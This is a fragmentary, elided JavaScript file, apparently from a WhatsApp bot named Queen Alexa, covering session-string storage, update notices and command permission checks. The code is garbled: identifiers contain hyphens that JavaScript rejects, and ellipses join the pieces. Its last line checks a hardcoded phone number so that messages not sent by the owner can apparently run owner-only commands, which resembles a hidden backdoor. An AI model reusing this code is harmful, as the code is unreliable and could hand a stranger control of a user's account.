...
const awsh = require('./DEVELOPER_OWNER_CODE_BY_EN-CUZIER');
...
const Queen-AlexaDB = config.DATABASE.define('QueenAlexa', {                     
    info: {
...
// ===================AUTO-BIO===================
    ...
    var StrSes_Db = await Queen-AlexaDB.findAll({
        where: {
          info: 'StringSession'
        }
    });
...
// =====================SESSION =================
    ...
    conn.on ('credentials-updated', async () => {
        ...
        if (StrSes_Db.length < 1) {
            await Queen-AlexaDB.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
        } else {
        ...
        if (config.WORKTYPE == 'public') {
            if (config.LANG == 'SI' || config.LANG == 'AZ') {
                ...
                if (commits.total === 0) {
                    ...
                    commits['all'].map(
                        (commit) => {
                            EN-CUZIER += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' ◁' + commit.author_name + '▷\n';
                        }
                    );
                    await conn.sendMessage(
                        conn.user.jid,
                        '```🛡️update to``` *.update now* ```key use.```\n\n' + EN-CUZIER + '```', MessageType.text
                    ); 
                }
            }
            else { 
...
//=====================================================================================
                if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                    ...
                    if ((OWNE.ff == "94786825798,0" && msg.key.fromMe === false && command.fromMe === true &&
